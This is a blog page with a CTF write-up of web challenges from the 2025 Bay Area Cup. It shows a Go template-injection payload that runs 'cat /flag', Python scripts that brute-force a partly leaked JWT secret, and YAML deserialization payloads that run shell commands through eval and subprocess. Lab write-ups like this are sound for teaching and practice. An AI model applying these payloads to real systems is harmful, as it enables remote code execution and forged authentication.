@@ -1,0 +1,294 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025年湾区杯网络安全大赛web题解 | symv1a</title><meta name="author" content="symv1a,symv1a@163.com"><meta name="copyright" content="symv1a"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2025年湾区杯网络安全大赛web题解Websstigo 模版引擎注入   存在两个函数可用 exec​ B64Decode 执行 &#123;&#123; exec (B64Decode &quot;Y2F0IC9mbGFn&quot;) &#125;&#125;即可得到flag:  ez_pythonjwt伪造，获得执行权限 随便写一点，然后得到报错中的hint 1&#123;&quot;error&quot;:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025年湾区杯网络安全大赛web题解">
+<meta property="og:url" content="https://symya.github.io/post/bay-area-cup-ziewoh.html">
+<meta property="og:site_name" content="symv1a">
+<meta property="og:description" content="2025年湾区杯网络安全大赛web题解Websstigo 模版引擎注入   存在两个函数可用 exec​ B64Decode 执行 &#123;&#123; exec (B64Decode &quot;Y2F0IC9mbGFn&quot;) &#125;&#125;即可得到flag:  ez_pythonjwt伪造，获得执行权限 随便写一点，然后得到报错中的hint 1&#123;&quot;error&quot;:">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png">
+<meta property="article:published_time" content="2025-09-08T08:58:12.000Z">
+<meta property="article:modified_time" content="2025-09-10T15:21:08.000Z">
+<meta property="article:author" content="symv1a">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025年湾区杯网络安全大赛web题解",
+  "url": "https://symya.github.io/post/bay-area-cup-ziewoh.html",
+  "image": "https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png",
+  "datePublished": "2025-09-08T08:58:12.000Z",
+  "dateModified": "2025-09-10T15:21:08.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "symv1a",
+      "url": "https://symya.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><link rel="canonical" href="https://symya.github.io/post/bay-area-cup-ziewoh.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025年湾区杯网络安全大赛web题解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" alt="Logo"><span class="site-name">symv1a</span></a><a class="nav-page-title" href="/"><span class="site-name">2025年湾区杯网络安全大赛web题解</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025年湾区杯网络安全大赛web题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-08T08:58:12.000Z" title="Created 2025-09-08 08:58:12">2025-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-10T15:21:08.000Z" title="Updated 2025-09-10 15:21:08">2025-09-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">498</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>2mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:150,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-09-10 15:21:08&quot;}" hidden></div><h1 id="2025年湾区杯网络安全大赛web题解"><a href="#2025年湾区杯网络安全大赛web题解" class="headerlink" title="2025年湾区杯网络安全大赛web题解"></a>2025年湾区杯网络安全大赛web题解</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>go 模版引擎注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106143901.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106143908.jpg"></p>
+<p>存在两个函数可用 <code>exec</code>​ <code>B64Decode</code></p>
+<p>执行 <code>&#123;&#123; exec (B64Decode "Y2F0IC9mbGFn") &#125;&#125;</code>即可得到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106143910.png"></p>
+<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>jwt伪造，获得执行权限</p>
+<p>随便写一点，然后得到报错中的hint</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;JWT Decode Failed. Key Hint&quot;</span>,<span class="string">&quot;hint&quot;</span>:<span class="string">&quot;Key starts with \&quot;@o70xO<span class="variable">$0</span>%#qR9#**\&quot;. The 2 missing chars are alphanumeric (letters and numbers).&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到密钥，爆破两位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@o70xO$0%#qR9#**</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac, hashlib, base64, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 JWT</span></span><br><span class="line">token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的密钥前缀（两位未知，用 ** 表示）</span></span><br><span class="line">prefix = <span class="string">&quot;@o70xO$0%#qR9#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合 JWT 的前两段（用于 HMAC 输入）</span></span><br><span class="line">header, payload, sig_b64url = token.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">signing_input = <span class="string">f&quot;<span class="subst">&#123;header&#125;</span>.<span class="subst">&#123;payload&#125;</span>&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64URL 解码签名（注意补齐 &#x27;=&#x27;）</span></span><br><span class="line">pad = <span class="string">&quot;=&quot;</span> * (-<span class="built_in">len</span>(sig_b64url) % <span class="number">4</span>)</span><br><span class="line">target_sig = base64.urlsafe_b64decode(sig_b64url + pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备选字符集：字母、数字、常见符号（等同于可打印 ASCII）</span></span><br><span class="line">charset = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_bruteforce</span>():</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">            key = (prefix + a + b).encode()</span><br><span class="line">            mac = hmac.new(key, signing_input, hashlib.sha256).digest()</span><br><span class="line">            <span class="keyword">if</span> hmac.compare_digest(mac, target_sig):</span><br><span class="line">                <span class="keyword">return</span> prefix + a + b</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">full_key = try_bruteforce()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;FOUND KEY:&quot;</span>, full_key)</span><br></pre></td></tr></table></figure>
+
+<p>​<code>FOUND KEY: @o70xO$0%#qR9#m0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">import string</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"># 目标 JWT token</span><br><span class="line">target_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E&quot;</span><br><span class="line"></span><br><span class="line"># 已知密钥前缀</span><br><span class="line">partial_secret = &quot;@o70xO$0%#qR9#&quot;</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits </span><br><span class="line"></span><br><span class="line"># 已知 payload</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;username&quot;: &quot;guest&quot;,</span><br><span class="line">    &quot;role&quot;: &quot;user&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 已知 header</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def generate_token(secret: str) -&gt; str:</span><br><span class="line">    return jwt.encode(payload, secret, algorithm=&quot;HS256&quot;, headers=headers)</span><br><span class="line"></span><br><span class="line">def brute_force_secret():</span><br><span class="line">    for c1, c2 in itertools.product(charset, repeat=2):</span><br><span class="line">        candidate = partial_secret + c1 + c2</span><br><span class="line">        try:</span><br><span class="line">            token = generate_token(candidate)</span><br><span class="line">            if token == target_token:</span><br><span class="line">                print(f&quot;[✓] 找到密钥: &#123;candidate&#125;&quot;)</span><br><span class="line">                return candidate</span><br><span class="line">        except Exception as e:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;[-] 爆破失败，未找到匹配的密钥。&quot;)</span><br><span class="line">    return None</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    brute_force_secret()</span><br></pre></td></tr></table></figure>
+
+<p>@o70xO$0%#qR9#m0</p>
+<p>YAML利用Python标签来实现代码执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> !!python/object/apply:builtins.eval</span><br><span class="line">- <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>{“result”:”app\nbin\nboot\ndev\netc\nf1111ag\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n”}</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106143911.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/apply:builtins.str</span><br><span class="line">!!python/object/apply:subprocess.check_output </span><br><span class="line">[<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-lc&quot;</span>, <span class="string">&quot;id; uname -a; pwd&quot;</span>]</span><br><span class="line">utf-8</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106143914.png"></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://symya.github.io">symv1a</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://symya.github.io/post/bay-area-cup-ziewoh.html">https://symya.github.io/post/bay-area-cup-ziewoh.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/snake-yaml-deserialization-vulnerability-z1tknlk.html" title="snake yaml 反序列化漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">snake yaml 反序列化漏洞</div></div><div class="info-2"><div class="info-item-1">snake yaml 反序列化漏洞关键漏洞概览：CVE-2022-1471 漏洞原因SnakeYAML 在使用 Constructor()​（默认构造器）解析 YAML 时，并未限制可被实例化的 Java 类型。这意味着，若解析来自不受信任来源的 YAML，攻击者可以构造恶意 payload，通过 “全局 tag” 语法（例如 !!com.sun.rowset.JdbcRowSetImpl &#123;...&#125;）执行远程代码。  影响版本所有 低于 2.0 的 SnakeYAML 版本都存在该风险（即 &lt;= 1.x 系列）  修复版本Snakeyaml 2.0 自 2023 年 2 月发布起（有源指出），内置了安全机制：默认 Constructor​ 继承自 SafeConstructor，禁止全局标签，避免任意类型实例化  安全建议  将 SnakeYAML 升级至 2.0 或更高版本。 若无法立即升级，应使用 SafeConstructor​ 或者配置 LoaderOptions 进行 tag...</div></div></div></a><a class="pagination-related" href="/post/the-5th-great-wall-cup-cyber-security-competitionwriteup-1csjtb.html" title="第五届“长城杯”网络安全大赛-WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">第五届“长城杯”网络安全大赛-WriteUp</div></div><div class="info-2"><div class="info-item-1">第五届“长城杯”网络安全大赛-WriteUpweb文曲签学fn长按有特殊模式，#read 双写绕过，目录遍历得到flag  ​flag&#123;cec7356d-d3c7-470d-8d04-7fd8d017d58f&#125; ‍ SeRce123456789&lt;?phphighlight_file(__FILE__);$exp = $_GET[&quot;exp&quot;];if(isset($exp))&#123;    if(serialize(unserialize($exp)) != $exp)&#123;        $data = file_get_contents($_POST[&#x27;filetoread&#x27;]);        echo &quot;File Contents: $data&quot;;    &#125;&#125;  利用“声明的元素个数”与“实际内容”不一致，绕过了 if 的检查 123?exp=a%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A1%3A%22b%22%3B%7D#...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/2025-jingqi-ctf-preliminary-competitionweb-z108qvu.html" title="2025京麒CTF初赛-web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-28</div><div class="info-item-2">2025京麒CTF初赛-web</div></div><div class="info-2"><div class="info-item-1">2025京麒CTF初赛-web计算器前端删除expression​的disable，然后就可以正常输入了。 代码注入，成功  flag在环境变量中  赛后看到其他师傅的解法，打的websocket ‍ FastJ 复现附件：FastJ-1.0-SNAPSHOT-11.jar 参考：2025第三届京麒CTF挑战赛 writeup by Mini-Venom | CTF导航 前置知识fastjson的“AutoTypeCheck”机制Fastjson 从1.2.68​开始引入白名单，在 1.2.80​ 中更加严格。只有在 白名单 中的类才能通过 @type 被反序列化。  一些常见 Java 基础类，例如：  ​java.util.HashMap ​java.util.ArrayList ​java.lang.Integer ​java.lang.String   特定配置下用户添加的类（通过 ParserConfig.addAccept(&quot;com.example.&quot;)）  特定第三方库被明示允许的类（比如某些 JSON 处理类）    不再支持自动根据...</div></div></div></a><a class="pagination-related" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-20</div><div class="info-item-2">2025RCTF wp</div></div><div class="info-2"><div class="info-item-1">2025RCTF wpMISCSignin ‍  Shadows of AsgardChallenge 1: The Merchant’s Mask  Challenge 2: The Parasite’s NestC:\Users\dell\Desktop\Microsoft VS Code\Code.exe  流量包中存在C2 加密流量，解密方法为：  Base64 decode → ASCII hex ​bytes.fromhex() → AES 密文字节 ​AES.new(key, AES.MODE_CBC, iv).decrypt() → 明文 按 PKCS7 去 padding decode UTF-8 → 得到 JSON &#x2F; 文本 &#x2F;...</div></div></div></a><a class="pagination-related" href="/post/ccb-z184yjw.html" title="ccb&amp;ciscn线下半决赛 - wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ccb&amp;ciscn线下半决赛 - wp</div></div><div class="info-2"><div class="info-item-1">ccb&amp;ciscn线下半决赛 - wp 有幸拿到一等奖  awdpphp-master 导入 12345# docker 导入docker load -i xxx.tar# 不知道端口的情况下运行该镜像docker run -it &lt;images&gt; /bin/bash  查看运行端口，发现就是80，那就可以用以下命令运行docker 123docker run -d -p 4545:80 &lt;images&gt; # 进入容器docker exec -it &lt;container&gt; /bin/bash  ‍ 在容器中找到index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php@error_reporting(E_ALL);if...</div></div></div></a><a class="pagination-related" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">MAC+IDA Pro9.2+MCP+Trae配置教程</div></div><div class="info-2"><div class="info-item-1">MAC+IDA Pro9.2+MCP+Trae配置教程查询系统python安装路径，这里要保证版本大于3.11。然后找到系统级 Python 嵌入路径 12brew list | grep pythonbrew --prefix python@3.13   12345# 让 IDA 9.0 的 IDAPython 绑定这个 Pythoncd /Applications/IDA\ Professional\ 9.2.app/Contents/MacOS./idapyswitch --force-path \/opt/homebrew/opt/python@3.13/Frameworks/Python.framework/Versions/3.13/Python  接着切换到python的bin目录，安装ida mcp的依赖 12cd /opt/homebrew/opt/python@3.13/bin./pip3.13 install --upgrade --break-system-packages ...</div></div></div></a><a class="pagination-related" href="/post/python-deserialization-vulnerability-analysis-zueyob.html" title="Python反序列化漏洞分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-05</div><div class="info-item-2">Python反序列化漏洞分析</div></div><div class="info-2"><div class="info-item-1">Python反序列化漏洞分析前置知识 Python 对象序列化Python中序列化一般有三种方式: pickle模块和json模块, 还有一个更原始的序列化模块marshal。pickle模块是Python特有的格式, json模块是json通用的格式。marshal存在主要是为了支持 Python 的 .pyc 文件。一般地 pickle 应该是序列化 Python 对象时的首选。 官方文档的解释：pickle — Python 对象序列化 — Python 3.12.5 文档 python中可以被序列化和反序列化的对象下列类型可以被封存：  内置常量 (None, True, False, Ellipsis 和 NotImplemented)； 整数、浮点数、复数; 字符串、字节串、字节数组; 只包含可封存对象的元组、列表、集合和字典; 可在模块最高层级上访问的（内置与用户自定义的）函数（使用 def，而不是使用 lambda 定义）; 可在模块最高层级上访问的类; 这种类的实例调用 \_\_getstate\_\_() 的结果是可 pickle...</div></div></div></a><a class="pagination-related" href="/post/the-5th-great-wall-cup-cyber-security-competitionwriteup-1csjtb.html" title="第五届“长城杯”网络安全大赛-WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-16</div><div class="info-item-2">第五届“长城杯”网络安全大赛-WriteUp</div></div><div class="info-2"><div class="info-item-1">第五届“长城杯”网络安全大赛-WriteUpweb文曲签学fn长按有特殊模式，#read 双写绕过，目录遍历得到flag  ​flag&#123;cec7356d-d3c7-470d-8d04-7fd8d017d58f&#125; ‍ SeRce123456789&lt;?phphighlight_file(__FILE__);$exp = $_GET[&quot;exp&quot;];if(isset($exp))&#123;    if(serialize(unserialize($exp)) != $exp)&#123;        $data = file_get_contents($_POST[&#x27;filetoread&#x27;]);        echo &quot;File Contents: $data&quot;;    &#125;&#125;  利用“声明的元素个数”与“实际内容”不一致，绕过了 if 的检查 123?exp=a%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A1%3A%22b%22%3B%7D#...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" 